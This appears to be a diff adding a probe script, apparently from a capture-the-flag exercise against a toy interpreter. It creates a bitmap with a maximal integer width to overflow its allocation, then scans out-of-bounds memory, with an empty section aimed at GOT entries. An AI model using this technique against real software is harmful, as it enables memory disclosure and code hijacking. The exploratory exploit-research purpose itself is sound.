@@ -1,0 +1,47 @@
+bitmap b1 = create(9223372036854775807, 2);
+
+print("=== Reading from y=0 (safe location) ===");
+int bit0 = get(b1, 0, 0);
+int bit1 = get(b1, 1, 0);
+int bit2 = get(b1, 2, 0);
+int bit3 = get(b1, 3, 0);
+int bit4 = get(b1, 4, 0);
+int bit5 = get(b1, 5, 0);
+int bit6 = get(b1, 6, 0);
+int bit7 = get(b1, 7, 0);
+print(bit0);
+print(bit1);
+print(bit2);
+print(bit3);
+print(bit4);
+print(bit5);
+print(bit6);
+print(bit7);
+
+print("=== Reading adjacent bytes (y=0, different x) ===");
+int byte8 = get(b1, 8, 0);
+int byte16 = get(b1, 16, 0);
+int byte24 = get(b1, 24, 0);
+int byte32 = get(b1, 32, 0);
+int byte40 = get(b1, 40, 0);
+int byte48 = get(b1, 48, 0);
+int byte56 = get(b1, 56, 0);
+int byte64 = get(b1, 64, 0);
+print(byte8);
+print(byte16);
+print(byte24);
+print(byte32);
+print(byte40);
+print(byte48);
+print(byte56);
+print(byte64);
+
+print("=== Testing small y values ===");
+
+int testint = 42;
+string teststr = "test";
+bitmap testbmp = create(10, 10);
+
+print("=== Attempting to read from potential GOT locations ===");
+
+print("=== OOB read scan completed ===");
